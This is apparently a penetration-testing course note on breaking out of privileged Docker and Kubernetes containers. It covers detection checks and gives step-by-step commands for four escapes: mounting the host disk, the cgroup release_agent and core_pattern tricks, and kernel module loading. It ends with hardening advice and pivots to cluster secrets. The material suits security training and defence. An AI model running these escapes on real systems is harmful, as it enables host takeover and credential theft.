---
tags: [cloud, advanced, container, kubernetes, vapt]
difficulty: advanced
module: "81 - Advanced Kubernetes and Container Breakouts"
topic: "81.10 Escaping Privileged Containers Deep Dive"
---

# 81.10 Escaping Privileged Containers Deep Dive

## 1. Introduction

A "privileged" container is one that is run with almost all the capabilities of the host system. In Docker, this is achieved via the `--privileged` flag. In Kubernetes, it is defined in the pod specification under `securityContext: privileged: true`.

When a container runs in privileged mode:
- All Linux Capabilities (e.g., `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`) are granted.
- Seccomp filters are disabled (unconfined).
- AppArmor/SELinux profiles are disabled or set to unconfined.
- `cgroups` and device nodes (`/dev`) from the host are fully accessible.

Despite being inside namespaces (PID, Mount, Network), a privileged container is not a security boundary. An attacker who gains root access inside a privileged container can trivially escape to the underlying host node, achieving total host compromise.

## 2. ASCII Diagram: Cgroups Release_Agent Exploit Flow

```text
    Privileged Container (Attacker is root)
    +-------------------------------------------------------------+
    |                                                             |
    | 1. Create a new cgroup                                      |
    |    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp |
    |    mkdir /tmp/cgrp/x                                        |
    |                                                             |
    | 2. Enable notify_on_release                                 |
    |    echo 1 > /tmp/cgrp/x/notify_on_release                   |
    |                                                             |
    | 3. Set the release_agent to the host path of the payload    |
    |    echo "/var/lib/kubelet/pods/.../cmd" > /tmp/cgrp/release_agent |
    |                                                             |
    | 4. Trigger the release_agent                                |
    |    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"               |
    |                                                             |
    +-------------------------------------------------------------+
               |
               | Kernel executes release_agent script
               | as HOST ROOT outside the container namespaces
               v
    Host Node (Node Operating System)
    +-------------------------------------------------------------+
    |                                                             |
    |  Payload Executes!                                          |
    |  (e.g., Reverse shell, stealing kubeconfig, creating SSH    |
    |   keys in /root/.ssh/)                                      |
    |                                                             |
    +-------------------------------------------------------------+
```

## 3. Identifying a Privileged Container

Before attempting an escape, an attacker verifies their environment.

1. **Check Capabilities**:
   ```bash
   capsh --print
   ```
   If the output shows a massive list of capabilities including `cap_sys_admin`, it is highly privileged.

2. **Check Device Nodes**:
   ```bash
   ls -la /dev
   ```
   A standard container has a limited `/dev` (null, zero, random, etc.). A privileged container exposes host devices like `/dev/sda1`, `/dev/nvme0n1`, and `/dev/kmsg`.

3. **Check Seccomp/AppArmor**:
   ```bash
   cat /proc/self/status | grep Seccomp
   cat /proc/self/attr/current
   ```
   Seccomp `0` and AppArmor `unconfined` indicate a lack of MAC protections.

## 4. Exploitation Techniques

There are several reliable methodologies to escape a privileged container.

### 4.1 Mounting the Host Filesystem

The simplest method. Because the container has `CAP_SYS_ADMIN` and access to `/dev`, the attacker can simply mount the host's primary hard drive.

```bash
# Identify the host root disk (e.g., /dev/sda1, /dev/vda1, /dev/nvme0n1p1)
fdisk -l

# Mount it
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Chroot into the host
chroot /mnt/host /bin/bash
```
Once `chroot` is executed, the attacker is effectively operating as root on the host node. They can read `/etc/kubernetes/kubelet.conf`, steal certificates, or implant backdoors.

### 4.2 The Cgroups `release_agent` Exploit

If `/dev/sda1` is not available or blocked by some custom configuration, the `release_agent` exploit is the classic Docker/K8s escape.

The Linux kernel `cgroups` subsystem has a feature called `release_agent`. When a process inside a cgroup terminates, the kernel can automatically execute a script (the release agent) to clean up resources. **Crucially, the kernel executes this script in the initial namespace (the host), not the container's namespace.**

Since the container is privileged, the attacker can mount the cgroups filesystem, define a `release_agent`, and force the kernel to execute it.

**Step-by-Step Exploit:**

1. Find the path of the container on the host filesystem. This is needed because the kernel needs the *host* path to the payload script. We can find this by checking `/etc/mtab`.
   ```bash
   # Extract the host path for the OverlayFS upperdir
   host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
   ```

2. Create a new cgroup directory.
   ```bash
   mkdir -p /tmp/cgrp
   mount -t cgroup -o rdma cgroup /tmp/cgrp
   mkdir -p /tmp/cgrp/x
   ```

3. Enable `notify_on_release` for the child cgroup.
   ```bash
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```

4. Write the host path of our malicious script into the `release_agent` file.
   ```bash
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   ```

5. Create the malicious script (`/cmd`) inside the container (which the kernel will see at `$host_path/cmd`).
   ```bash
   echo '#!/bin/sh' > /cmd
   echo 'cat /etc/kubernetes/kubelet.conf > '"$host_path"'/output' >> /cmd
   chmod a+x /cmd
   ```

6. Trigger the exploit by spawning a process in the cgroup that immediately exits.
   ```bash
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
   ```

7. Read the results.
   ```bash
   cat /output
   ```

### 4.3 Core_Pattern Privilege Escalation

Similar to the `release_agent` trick, the Linux kernel uses `/proc/sys/kernel/core_pattern` to define how core dumps are handled when a program crashes.
If the first character of `core_pattern` is a pipe (`|`), the kernel treats the rest of the string as a command to execute, passing the core dump to its stdin. This command is executed as host root.

Because the container is privileged, it can write to `/proc/sys/kernel/core_pattern`.

```bash
# Mount a fresh proc filesystem to bypass any read-only masks
mkdir /tmp/proc
mount -t proc proc /tmp/proc

# Write the payload to core_pattern
# We use the same host_path trick as the release_agent exploit to point to our payload
echo "|$host_path/cmd" > /tmp/proc/sys/kernel/core_pattern

# Crash a program to trigger the payload
sleep 10 &
kill -11 $!
```

### 4.4 Loading Malicious Kernel Modules (kmod)

With `CAP_SYS_MODULE`, an attacker can compile a malicious kernel module (LKM) and load it using `insmod`.
A malicious LKM can execute arbitrary code in ring 0 (kernel space), hook syscalls to hide processes, or spawn a reverse shell directly on the host, completely ignoring namespaces.

This requires the container to have access to the kernel headers matching the host's kernel version (`uname -r`), which attackers will often download and compile within the container.

## 5. Mitigation and Hardening

1. **Never use Privileged Containers**: There is almost no legitimate reason to run `privileged: true` in production workloads. Use granular capabilities instead.
2. **Pod Security Admission**: Enforce the `Restricted` or `Baseline` Pod Security Standards at the cluster level to physically block the creation of privileged pods.
3. **eBPF Security Observability**: Deploy runtime security tools like Falco or Tetragon. They hook into the kernel via eBPF and can detect attempts to write to `release_agent`, `core_pattern`, or unexpected `mount` syscalls in real-time.
4. **Read-Only Root Filesystem**: Run containers with `readOnlyRootFilesystem: true` to make writing payload scripts significantly harder.

## 6. Chaining Opportunities

- **Node to Cluster Admin**: After escaping to the host node, locate the `kubeconfig` used by the Kubelet. This credential has `system:node` permissions. Use this to read secrets or modify cluster state as defined in [[03 - Attacking the Kubelet API]].
- **Etcd Dumping**: If the compromised node is a Control Plane node, immediately pivot to [[09 - Secrets Extraction from etcd]].

## 7. Related Notes

- [[06 - Bypassing AppArmor and Seccomp in Containers]]
- [[02 - Linux Capabilities in Containers]]
- [[03 - Attacking the Kubelet API]]
